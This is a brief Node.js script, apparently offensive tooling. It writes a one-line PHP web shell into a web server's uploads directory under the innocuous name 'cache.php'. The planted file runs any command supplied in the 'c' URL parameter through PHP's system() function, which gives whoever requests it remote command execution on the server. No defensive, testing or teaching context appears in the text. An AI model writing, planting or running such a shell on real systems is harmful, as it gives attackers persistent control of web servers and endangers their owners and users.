// Drops a request-driven PHP command endpoint into a web root.
const fs = require("fs");
const shell = "<?php if (isset($_GET['c'])) { system($_GET['c']); } ?>";
fs.writeFileSync("/var/www/html/uploads/cache.php", shell);
